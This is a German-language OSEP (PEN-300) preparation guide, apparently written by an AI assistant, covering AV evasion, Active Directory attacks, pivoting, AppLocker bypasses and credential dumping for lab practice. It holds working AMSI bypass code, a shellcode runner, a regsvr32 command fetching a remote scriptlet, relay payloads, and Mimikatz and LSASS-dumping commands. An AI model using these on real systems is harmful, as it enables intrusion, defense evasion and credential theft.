# OSEP (PEN-300) Prüfungsvorbereitung - Vollständiger Leitfaden

Ich helfe dir mit einer umfassenden, praxisorientierten Vorbereitung für die OSEP-Zertifizierung. Diese Prüfung ist deutlich anspruchsvoller als OSCP und erfordert fortgeschrittene Penetration Testing-Fähigkeiten.

## Was ist OSEP/PEN-300?

PEN-300 (Evasion Techniques and Breaching Defenses) ist OffSec's fortgeschrittener Penetration Testing-Kurs, der auf OSCP aufbaut. Die Prüfung dauert 48 Stunden plus 24 Stunden für den Bericht - insgesamt 72 Stunden. Du musst in einer simulierten Unternehmensumgebung mit aktivierten Sicherheitsmaßnahmen (AV, EDR, AppLocker, AMSI) mehrere Hosts kompromittieren und Lateral Movement durchführen.

## Kernthemen und praktische Vorbereitung

### 1. Advanced Antivirus & EDR Evasion

**Was du lernen musst:**
- AMSI (Antimalware Scan Interface) Bypasses
- Windows Defender und kommerzielle AV-Umgehung
- In-Memory Execution Techniken
- Process Injection Methoden
- Obfuskation von Payloads und Scripts

**Praktische Übungen:**
- Erstelle eigene C# Shellcode Runner mit verschiedenen Process Injection-Techniken (CreateRemoteThread, QueueUserAPC, Process Hollowing)
- Schreibe PowerShell-Scripts mit AMSI Bypass-Techniken
- Entwickle Custom Stageless Payloads für Metasploit/Cobalt Strike
- Übe das Obfuskieren von C#-Code mit ConfuserEx oder manuellen Techniken
- Teste deine Payloads gegen Windows Defender in einer VM

**Wichtige Techniken:**
```plaintext
- AMSI Bypass via Memory Patching
- ETW (Event Tracing for Windows) Patching
- Unhooking von DLLs
- Direct Syscalls statt API-Calls
- Reflective DLL Injection
```

### 2. Advanced Active Directory Angriffe

**Was du lernen musst:**
- Kerberos-Angriffe (Kerberoasting, AS-REP Roasting, Golden/Silver Tickets)
- Constrained/Unconstrained Delegation Missbrauch
- NTLM Relay Angriffe
- Domain Trusts und Forest-übergreifende Angriffe
- ACL-basierte Angriffe (DCSync, Resource-Based Constrained Delegation)

**Praktische Übungen:**
- Baue ein eigenes AD-Lab mit mindestens 3 Domains und verschiedenen Trust-Beziehungen
- Übe Kerberoasting mit Rubeus und cracke die Tickets mit Hashcat
- Implementiere NTLM Relay-Angriffe mit ntlmrelayx
- Nutze BloodHound intensiv zur Pfadanalyse
- Übe das Extrahieren von NTDS.dit auf verschiedene Arten

**Wichtige Tools:**
- Rubeus (Kerberos-Angriffe)
- Certify (AD CS-Angriffe)
- PowerView/SharpView (AD-Enumeration)
- Mimikatz/SafetyKatz (Credential Dumping)
- BloodHound (Attack Path Analysis)

### 3. Lateral Movement & Pivoting

**Was du lernen musst:**
- WMI, WinRM, DCOM für Remote Execution
- PSRemoting und deren Einschränkungen umgehen
- Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash
- Port Forwarding und Tunneling (Chisel, ligolo-ng, SSH)
- Living-off-the-Land Binaries (LOLBins)

**Praktische Übungen:**
- Setze komplexe Pivot-Chains mit mehreren Netzwerksegmenten auf
- Übe WMI-basierte Lateral Movement ohne PowerShell
- Nutze DCOM-Objekte für Remote Code Execution
- Baue Reverse-Proxies für interaktiven Zugriff auf interne Netzwerke
- Praktiziere mit verschiedenen Tunneling-Tools

### 4. Application Whitelisting Bypasses

**Was du lernen musst:**
- AppLocker Policy-Analyse und Bypass-Techniken
- Trusted Binaries für Proxy Execution (regsvr32, mshta, InstallUtil)
- DLL Search Order Hijacking
- Alternate Data Streams
- Windows Scripting Host-Umgehungen

**Praktische Übungen:**
- Richte AppLocker in einer Test-VM mit verschiedenen Policies ein
- Übe das Ausnutzen von Trusted Directories
- Nutze regsvr32.exe für .sct-File Execution
- Implementiere DLL Sideloading bei legitimen Anwendungen
- Erstelle Payloads die in-memory ausgeführt werden ohne auf Disk zu schreiben

### 5. Post-Exploitation & Persistence

**Was du lernen musst:**
- Registry-basierte Persistence
- WMI Event Subscriptions
- Scheduled Tasks mit versteckten Triggern
- COM Hijacking
- Golden Ticket Attacks für langfristige Persistence

**Praktische Übungen:**
- Implementiere mindestens 5 verschiedene Persistence-Mechanismen
- Übe das Verstecken von Persistence vor forensischen Tools
- Erstelle backdoored Services mit legitimen Binaries
- Nutze PowerShell Profile für Persistence
- Implementiere Domain-weite Persistence mit GPOs

### 6. Linux Privilege Escalation & Post-Exploitation

**Was du lernen musst:**
- Kernel Exploits (aber als letztes Mittel)
- SUID/SGID Binary-Missbrauch
- Capabilities-basierte Privilege Escalation
- Docker/Container Escapes
- Cronjob und Path Hijacking

**Praktische Übungen:**
- Übe mit HackTheBox/TryHackMe Linux Privesc Machines
- Nutze LinPEAS/LinEnum automatisch, aber verstehe die Ausgabe
- Praktiziere manuelle Enumeration ohne Tools
- Lerne GTFOBins auswendig für gängige Binaries
- Übe das Pivoting von Linux-Hosts ins Windows-Netzwerk

### 7. Web Application Exploitation (im AD-Kontext)

**Was du lernen musst:**
- SQL Injection für lateral movement (xp_cmdshell)
- Deserialization-Angriffe (.NET)
- Server-Side Template Injection
- File Upload Bypasses
- SSRF zur internen Enumeration

**Praktische Übungen:**
- Nutze SQL Injection um NTLM Hashes zu stehlen (Responder)
- Exploite .NET Deserialization mit ysoserial.net
- Übe das Umgehen von File Upload-Beschränkungen
- Praktiziere SSRF gegen interne Services
- Lerne MSSQL für Lateral Movement zu nutzen

## Praktisches Lernprogramm (12-16 Wochen)

### Phase 1: Grundlagen festigen (Woche 1-3)
- Durcharbeite das gesamte PEN-300 Kursmaterial
- Mache alle Lab-Übungen mindestens zweimal
- Dokumentiere jede Technik mit eigenen Notizen
- Erstelle ein Cheat Sheet für jeden Hauptbereich

### Phase 2: Lab Practice (Woche 4-8)
- Arbeite durch alle Challenge Labs im PEN-300 Kurs
- Hole dir zusätzliche Lab-Zeit wenn nötig
- Übe verschiedene Angriffspfade für dieselben Ziele
- Zeitbeschränke dich selbst um Prüfungsdruck zu simulieren

### Phase 3: Externe Labs & CTFs (Woche 9-12)
- **Hack The Box:** Dante Pro Lab (hervorragend für AD)
- **TryHackMe:** Wreath, Holo, Throwback Networks
- **PentesterLab:** Advanced Windows Exploitation
- **RastaLabs/Cybernetics:** AD-fokussierte Pro Labs auf HTB

### Phase 4: Mock Exams & Refinement (Woche 13-16)
- Erstelle eigene Prüfungsszenarien mit 48h Zeitlimit
- Schreibe vollständige Berichte für jede Mock-Prüfung
- Identifiziere Schwachstellen und übe gezielt
- Optimiere dein Tooling und deine Notizen

## Technisches Setup

### Essenzielle Tools für deine Kali-VM:
```plaintext
Enumeration:
- BloodHound + SharpHound
- PowerView/SharpView
- ADRecon
- PingCastle

Exploitation:
- Rubeus (Kerberos)
- Certify (AD CS)
- SharpGPOAbuse
- Whisker (Shadow Credentials)

Lateral Movement:
- CrackMapExec/NetExec
- Evil-WinRM
- Impacket Suite (psexec, wmiexec, smbexec)
- Chisel/ligolo-ng (Tunneling)

Evasion:
- Invoke-Obfuscation
- ConfuserEx
- Donut (Shellcode Generation)
- ScareCrow (Payload Obfuscation)

C2 Frameworks:
- Sliver (empfohlen, open source)
- Metasploit (kennen, aber nicht übermäßig verlassen)
- Mythic (optional, aber sehr gut)
```

### Deine Development-Umgebung:
- Visual Studio 2022 (C# Development)
- Visual Studio Code (Python, PowerShell)
- Windows 10/11 VM für Testing
- Mehrere Domain-VMs für Lab-Arbeit

## Kritische Prüfungstipps

### Vor der Prüfung:
1. **Richte deine Umgebung perfekt ein** - teste alle Tools vorher
2. **Erstelle deine Cheat Sheets** - kategorisiert nach Szenario
3. **Bereite Report-Templates vor** - spare Zeit bei der Dokumentation
4. **Schlafe gut** - du hast 48h, nutze sie weise
5. **Plane Breaks** - alle 4-6 Stunden mindestens 30 Min Pause

### Während der Prüfung:
1. **Lese die Prüfungsanleitung GENAU** - verstehe die Ziele
2. **Enumerate gründlich** - überstürze nichts
3. **Dokumentiere ALLES** - Screenshots, Commands, Output
4. **Nutze mehrere Wege** - wenn ein Weg blockiert ist, versuche andere
5. **Bleibe methodisch** - verzettle dich nicht
6. **Privesc zuerst auf jedem Host** - dann lateral movement
7. **Nutze BloodHound früh** - verstehe die AD-Struktur

### Report Writing:
- Nutze die vollen 24h wenn nötig
- Strukturiere: Executive Summary, Technical Findings, Appendix
- Jeder Kompromiss braucht: Screenshots, Command-History, Explanation
- Reproduzierbare Steps sind KRITISCH
- Professional formatieren, keine Rechtschreibfehler

## Häufige Fallstricke

1. **Zu sehr auf Metasploit verlassen** - lerne native Tools
2. **AMSI/AV unterschätzen** - übe Evasion intensiv
3. **Schlechte Enumeration** - BloodHound ist dein bester Freund
4. **Keine Backups von Shells** - immer mehrere Zugangspunkte sichern
5. **Tunneling-Probleme** - übe Port Forwarding ausgiebig
6. **Zeit-Management** - setze Zeitlimits für jedes Ziel
7. **Dokumentation vernachlässigen** - Screenshots während der Arbeit, nicht nachher

## Empfohlene Ressourcen

**Bücher:**
- "Evading EDR" von Matt Hand
- "Red Team Development and Operations" von Joe Vest
- "Operator Handbook" von Joshua Picolet

**Blogs & Websites:**
- ired.team (Mantvydas Baranauskas)
- rastamouse.me (RastaLabs Creator)
- pentestlab.blog
- adsecurity.org (Sean Metcalf)

**YouTube Channels:**
- IppSec (HTB Walkthroughs)
- John Hammond
- The Cyber Mentor

**Practice Platforms:**
- Hack The Box Pro Labs (Dante, RastaLabs, Offshore)
- TryHackMe (Wreath, Holo Networks)
- PentesterLab
- CRTE/CRTP Labs (Altered Security)

## Mentales Vorbereitung

Die OSEP-Prüfung ist ein Marathon, kein Sprint. 48 Stunden sind lang, aber auch schnell vorbei wenn man feststeckt. 

**Wichtige Mindsets:**
- **Try Harder, Smart** - nicht nur brute force, sondern methodisch
- **Enumeration ist König** - 80% der Zeit sollte Recon/Enum sein
- **Jeder Host ist ein Stepping Stone** - denke an die Chain, nicht an einzelne Hosts
- **Bleibe ruhig** - wenn du steckenbleibst, mache eine Pause und enumerate neu
- **Vertraue deinem Training** - du hast genug geübt, vertraue deinen Fähigkeiten

## Finales Checklist vor der Prüfung

- [ ] Alle Lab-Challenges abgeschlossen
- [ ] Mindestens 3 externe AD Labs absolviert
- [ ] Eigene Tools und Payloads getestet
- [ ] Cheat Sheets vorbereitet und kategorisiert
- [ ] Report-Template fertig
- [ ] VM-Snapshots vor Prüfungsbeginn erstellt
- [ ] VPN-Konnektivität getestet
- [ ] Backup-Tools und Scripts bereit
- [ ] Ausgeruht und mental vorbereitet
- [ ] Proviant und Getränke für 48h organisiert

Viel Erfolg! Die OSEP ist herausfordernd, aber mit systematischer Vorbereitung definitiv erreichbar. Konzentriere dich auf praktische Übung, verstehe die Konzepte tiefgehend (nicht nur Copy-Paste), und baue echte Attack Chains in deinen Labs auf.



# OSEP (PEN-300) - Praktische Vorbereitung

Ich gebe dir jetzt eine **rein praktische Anleitung** - was du genau tun musst, Schritt für Schritt, mit konkreten Befehlen und Übungen.

---

## 1. AMSI & Antivirus Evasion - Praktisch

**Kurze Erklärung:** AMSI scannt PowerShell-Befehle und Scripts im Speicher bevor sie ausgeführt werden. Du musst lernen, diese Schutzmaßnahmen zu umgehen.

### Was du JETZT machst:

**Übung 1: Einfacher AMSI Bypass testen**
```powershell
# Starte PowerShell auf deiner Windows 10 VM
# Dieser String wird normalerweise von AMSI geblockt:
'Invoke-Mimikatz'

# AMSI Bypass Methode 1 - Memory Patching:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Jetzt teste wieder:
'Invoke-Mimikatz'  # Sollte nicht mehr geblockt werden
```

**Übung 2: Erstelle deinen ersten C# Shellcode Runner**

Erstelle eine Datei `runner.cs`:
```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=DEINE_IP LPORT=443 -f csharp
            byte[] buf = new byte[511] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8  // ... füge hier deinen Shellcode ein
            };

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

**Kompiliere es:**
```bash
# Auf deiner Kali-Maschine:
mcs runner.cs

# Oder auf Windows:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe runner.cs
```

**Übung 3: Obfuskiere deinen Code**
```bash
# Installiere ConfuserEx
git clone https://github.com/mkaring/ConfuserEx.git

# Obfuskiere deine EXE:
# 1. Öffne ConfuserEx GUI
# 2. Lade deine runner.exe
# 3. Aktiviere: Symbol Renaming, Control Flow, Anti-Debug
# 4. Protect!

# Teste gegen Defender:
# Kopiere die obfuskierte EXE auf deine Windows VM
# Scanne mit Defender - dokumentiere Erkennungsrate
```

**Tägliche Praxis (2 Wochen):**
- Tag 1-3: Teste 10 verschiedene AMSI Bypasses
- Tag 4-7: Schreibe 3 verschiedene Process Injection-Methoden (CreateRemoteThread, QueueUserAPC, Process Hollowing)
- Tag 8-10: Obfuskiere deine Payloads mit verschiedenen Tools
- Tag 11-14: Kombiniere alles: AMSI Bypass + Process Injection + Obfuskation

---

## 2. Active Directory Angriffe - Praktisch

**Kurze Erklärung:** Active Directory ist das Zielnetzwerk in der Prüfung. Du musst verschiedene Hosts kompromittieren und Domain Admin werden.

### Baue dein eigenes AD Lab:

**Schritt 1: Virtuelle Maschinen aufsetzen**
```plaintext
Benötigte VMs:
1. Domain Controller (Windows Server 2019/2022) - 4GB RAM
2. Client 1 (Windows 10) - 2GB RAM
3. Client 2 (Windows 10) - 2GB RAM
4. File Server (Windows Server) - 2GB RAM

Netzwerk: Internes Netzwerk "ADLab"
```

**Schritt 2: Domain Controller einrichten**
```powershell
# Auf dem DC (als Administrator):
# 1. Setze statische IP
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.100.10 -PrefixLength 24 -DefaultGateway 192.168.100.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.100.10

# 2. Installiere AD Domain Services
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# 3. Promote zu Domain Controller
Import-Module ADDSDeployment
Install-ADDSForest -DomainName "security.local" -DomainNetbiosName "SECURITY" -InstallDns

# Nach Neustart - Erstelle Test-User
New-ADUser -Name "John Doe" -GivenName "John" -Surname "Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@security.local" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

# Erstelle einen Service Account mit SPN (für Kerberoasting)
New-ADUser -Name "SQL Service" -SamAccountName "sqlsvc" -AccountPassword (ConvertTo-SecureString "MyPassword123!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity sqlsvc -ServicePrincipalNames @{Add='MSSQLSvc/sqlserver.security.local:1433'}
```

**Schritt 3: Clients zur Domain joinen**
```powershell
# Auf jedem Client:
# 1. DNS auf DC IP setzen
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.100.10

# 2. Join Domain
Add-Computer -DomainName "security.local" -Credential (Get-Credential)
Restart-Computer
```

### Praktische Angriffe - Schritt für Schritt:

**Angriff 1: Kerberoasting**

```bash
# Von deiner Kali-Maschine (nachdem du Initial Access hast):

# 1. Enumerate SPNs mit impacket
GetUserSPNs.py security.local/jdoe:Password123! -dc-ip 192.168.100.10 -request

# Output gibt dir TGS-Tickets. Speichere sie in hash.txt

# 2. Cracke den Hash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

# Alternative: Mit Rubeus (von kompromittiertem Windows-Host)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 3. Nutze gecrackte Credentials für weiteren Zugriff
```

**Angriff 2: NTLM Relay**

```bash
# Terminal 1 - Starte Responder (ohne SMB/HTTP Server)
sudo responder -I eth0 -v

# Terminal 2 - Setup ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64_PAYLOAD"

# targets.txt enthält:
# 192.168.100.11
# 192.168.100.12

# Terminal 3 - Triggere Authentication
# Nutze Metasploit oder manual:
crackmapexec smb 192.168.100.0/24 -u jdoe -p 'Password123!' -M slinky -o NAME=important_file SERVER=DEINE_IP
```

**Angriff 3: BloodHound für Attack Paths**

```bash
# 1. Sammle Daten mit SharpHound
# Auf kompromittiertem Windows-Host:
.\SharpHound.exe -c All -d security.local --zipfilename output.zip

# 2. Transferiere zu Kali und importiere in BloodHound
sudo neo4j console  # Starte Neo4j
bloodhound  # Starte BloodHound GUI

# 3. Upload output.zip in BloodHound

# 4. Suche nach Paths:
# - "Find Shortest Paths to Domain Admins"
# - Markiere deinen kompromittierten User als "Owned"
# - Suche "Shortest Paths from Owned Principals"

# 5. Analysiere den Pfad und folge ihm
```

**Angriff 4: DCSync Attack**

```bash
# Wenn du Rechte für DCSync hast (laut BloodHound):

# Methode 1: Mimikatz
mimikatz # lsadump::dcsync /domain:security.local /user:Administrator

# Methode 2: Impacket
secretsdump.py security.local/compromised_user:password@192.168.100.10 -just-dc

# Du erhältst alle NTLM-Hashes der Domain!

# Pass-the-Hash mit Administrator-Hash:
evil-winrm -i 192.168.100.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

**Wöchentliche Praxis (4 Wochen):**
- Woche 1: Baue dein Lab, übe Basic Enumeration (BloodHound, PowerView)
- Woche 2: Kerberoasting + AS-REP Roasting täglich
- Woche 3: NTLM Relay + Delegation Attacks
- Woche 4: Full Domain Compromise - von Zero zu Domain Admin

---

## 3. Lateral Movement - Praktisch

**Kurze Erklärung:** Du musst von einem kompromittierten Host zu anderen Hosts im Netzwerk springen.

### Praktische Techniken:

**Technik 1: PSRemoting mit gestohlenen Credentials**

```powershell
# Auf kompromittiertem Host mit Admin-Rechten:

# 1. Enable PSRemoting wenn deaktiviert
Enable-PSRemoting -Force

# 2. Erstelle PSSession zu anderem Host
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("security\administrator", $password)
$session = New-PSSession -ComputerName 192.168.100.11 -Credential $cred

# 3. Interagiere mit Remote-Host
Enter-PSSession $session
whoami
hostname

# 4. Führe Commands aus
Invoke-Command -Session $session -ScriptBlock { Get-Process }

# 5. Transferiere Dateien
Copy-Item -Path "C:\Tools\mimikatz.exe" -Destination "C:\Windows\Temp\" -ToSession $session
```

**Technik 2: WMI für stealth Movement**

```powershell
# WMI ist weniger geloggt als PSRemoting

# 1. Mit Credentials
$username = 'security\administrator'
$password = 'Password123!'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

# 2. Erstelle WMI-Session
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.100.11 -Credential $credential -SessionOption $options

# 3. Execute Command via WMI
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -enc BASE64_COMMAND"}

# Von Kali mit impacket:
wmiexec.py security/administrator:Password123!@192.168.100.11
```

**Technik 3: Pass-the-Hash**

```bash
# Von Kali nachdem du NTLM-Hash gedumpt hast:

# 1. Mit CrackMapExec (NetExec)
crackmapexec smb 192.168.100.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# 2. PSExec mit Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH security/administrator@192.168.100.11

# 3. Evil-WinRM mit Hash
evil-winrm -i 192.168.100.11 -u administrator -H NTLM_HASH

# 4. RDP mit Hash (mit xfreerdp)
xfreerdp /u:administrator /pth:NTLM_HASH /v:192.168.100.11
```

**Technik 4: Pivoting & Tunneling**

```bash
# Szenario: Du bist auf Host A, willst zu Host B (nicht direkt erreichbar)

# Methode 1: Chisel (empfohlen)

# Auf deiner Kali (Attacker):
./chisel server -p 8000 --reverse

# Auf kompromittiertem Host A (Windows):
.\chisel.exe client DEINE_KALI_IP:8000 R:socks

# Auf deiner Kali - konfiguriere proxychains:
# Edit /etc/proxychains4.conf
# Füge hinzu: socks5 127.0.0.1 1080

# Jetzt kannst du durch Host A pivoten:
proxychains crackmapexec smb 192.168.200.0/24 -u admin -p pass

# Methode 2: SSH Local Port Forward
ssh -L 8080:INTERNAL_HOST:80 user@COMPROMISED_HOST
# Jetzt: localhost:8080 = INTERNAL_HOST:80

# Methode 3: SSH Dynamic Port Forward (SOCKS)
ssh -D 1080 user@COMPROMISED_HOST
# Proxychains nutzt jetzt diesen SOCKS-Proxy

# Methode 4: ligolo-ng (neueres Tool, sehr gut)
# Auf Kali:
./ligolo-ng -selfcert -laddr 0.0.0.0:11601

# Auf Target:
.\agent.exe -connect KALI_IP:11601 -ignore-cert

# In ligolo Interface:
session # Wähle Session
start # Starte Tunnel
# Füge Route hinzu auf Kali:
sudo ip route add 192.168.200.0/24 dev ligolo
```

**2-Wochen Pivot-Training:**

```plaintext
Übungsaufbau:
Kali → Host A (DMZ: 10.10.10.0/24) → Host B (Internal: 192.168.1.0/24) → Host C (Secure: 172.16.0.0/24)

Tag 1-3: SSH Tunneling meistern
- Local, Remote, Dynamic Port Forwards
- Kombinationen von Tunnels

Tag 4-7: Chisel Setup perfektionieren
- Reverse SOCKS Proxy
- Port Forwarding
- Multiple Chains

Tag 8-10: ligolo-ng
- Interface Routing
- Multiple Pivots
- Performance-Testing

Tag 11-14: Komplette Chains
- Kali → A → B → C mit verschiedenen Tools
- Zeitlimit: Unter 30 Minuten für Full Chain
```

---

## 4. AppLocker & CLM Bypasses - Praktisch

**Kurze Erklärung:** AppLocker verhindert, dass nicht-autorisierte Programme ausgeführt werden. Constrained Language Mode (CLM) limitiert PowerShell-Funktionalität.

### Praktisches Setup:

**Erstelle Test-Umgebung:**

```powershell
# Auf deiner Windows 10 Test-VM (als Admin):

# 1. Aktiviere AppLocker
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service AppIDSvc

# 2. Erstelle grundlegende AppLocker Policy
# - Öffne: Local Security Policy → Application Control Policies → AppLocker
# - Create Default Rules für Executable, Scripts, Windows Installer
# - Enforce alle Rule Collections

# 3. Teste als normaler User
whoami
# Versuche ausführbaren zu starten: Access Denied

# 4. Aktiviere CLM (Constrained Language Mode)
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
# Neustart erforderlich

# Teste:
$ExecutionContext.SessionState.LanguageMode
# Sollte "ConstrainedLanguage" zeigen
```

### Praktische Bypasses:

**Bypass 1: Writable Directories finden**

```powershell
# AppLocker erlaubt oft Execution aus bestimmten Ordnern

# Standard writable locations:
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS

# Script um alle zu testen:
$paths = @(
    "C:\Windows\Tasks",
    "C:\Windows\Temp",
    "C:\Windows\tracing"
    # ... mehr hinzufügen
)

foreach ($path in $paths) {
    try {
        Copy-Item ".\payload.exe" -Destination "$path\test.exe" -ErrorAction Stop
        Write-Host "[+] Writable: $path" -ForegroundColor Green
        & "$path\test.exe"
        Remove-Item "$path\test.exe"
    } catch {
        Write-Host "[-] Not writable: $path" -ForegroundColor Red
    }
}
```

**Bypass 2: LOLBins (Living off the Land Binaries)**

```powershell
# Nutze vertrauenswürdige Windows-Binaries um Code auszuführen

# 1. InstallUtil.exe
# Erstelle payload.cs:
using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;

public class Program {
    public static void Main() {}
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        // Dein Code hier
        System.Diagnostics.Process.Start("cmd.exe");
    }
}

# Kompiliere:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library payload.cs

# Execute:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# 2. MSBuild.exe
# Erstelle payload.xml:
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using Microsoft.Build.Framework;
        using System.Diagnostics;
        public class ClassExample :  ITask {
          public IBuildEngine BuildEngine { get; set; }
          public ITaskHost HostObject { get; set; }
          public bool Execute() {
            Process.Start("cmd.exe");
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

# Execute:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# 3. regsvr32.exe (Squiblydoo)
# Erstelle payload.sct auf deinem Server:
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="1.00" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
</registration>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>

# Execute:
regsvr32.exe /s /u /i:http://DEINE_IP/payload.sct scrobj.dll
```

**Bypass 3: CLM Escape mit PSBypassCLM**

```bash
# Auf Kali:
git clone https://github.com/padovah4ck/PSBypassCLM.git
cd PSBypassCLM

# Kompiliere:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /target:library /out:PsBypassCLM.dll PsBypassCLM.cs

# Nutze InstallUtil um CLM zu umgehen:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U PsBypassCLM.dll

# In der neuen PowerShell:
$ExecutionContext.SessionState.LanguageMode
# Sollte jetzt "FullLanguage" zeigen!
```

**1-Woche AppLocker Bootcamp:**

```plaintext
Tag 1: Setup und Grundlagen
- Richte AppLocker auf Test-VM ein
- Teste Default Rules
- Dokumentiere erlaubte Pfade

Tag 2-3: LOLBins
- Teste alle 10+ gängigen LOLBins
- Erstelle eigene Payloads für jeden
- Automatisiere mit Scripts

Tag 4-5: CLM Bypasses
- PSBypassCLM
- Runspace Escape
- Custom CLM Bypasses

Tag 6-7: Integration
- Kombiniere mit AMSI Bypass
- Kombiniere mit AV Evasion
- Full Payload: AMSI + CLM + AppLocker Bypass
```

---

## 5. Credential Dumping - Praktisch

**Kurze Erklärung:** Du musst Passwörter und Hashes aus dem Speicher, Registry, und Dateien extrahieren.

### Praktische Techniken:

**Technik 1: Mimikatz (der Klassiker)**

```powershell
# Auf kompromittiertem Host mit Admin-Rechten:

# 1. Download und Execute (nach AV Evasion!)
.\mimikatz.exe

# 2. Privilege Escalation
privilege::debug
token::elevate

# 3. Dump LSASS
sekurlsa::logonpasswords

# 4. Dump SAM
lsadump::sam

# 5. Dump LSA Secrets
lsadump::secrets

# 6. Golden Ticket erstellen
# (Benötigt krbtgt Hash von DCSync)
kerberos::golden /user:Administrator /domain:security.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# 7. Dump Credentials von allen User-Sessions
sekurlsa::msv
sekurlsa::kerberos
sekurlsa::wdigest
```

**Technik 2: Prozess-Dump für Offline-Analyse**

```powershell
# Methode 1: Task Manager (GUI, weniger verdächtig)
# - Öffne Task Manager
# - Finde lsass.exe
# - Rechtsklick → Create Dump File

# Methode 2: ProcDump (Sysinternals)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Methode 3: PowerShell (stealth)
Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp\

# Transfer zu Kali und parse:
pypykatz lsa minidump lsass.dmp
```

**Technik 3: NTDS.dit Extraction**

```powershell
# Auf Domain Controller (oder mit DCSync-Rechten):

# Methode 1: VSS (Volume Shadow Copy)
# Als Administrator auf DC:
wmic /node:DC01 /user:DOMAIN\Admin /password:Pass process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > C:\vss.log"

# Mount Shadow Copy
mklink /d C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# Copy NTDS.dit
copy C:\shadowcopy\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy C:\shadowcopy\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Transfer zu Kali und extract:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Methode 2: Mit CrackMapExec
crackmapexec smb 192.168.100.10 -u administrator -p 'Password123!' --ntds

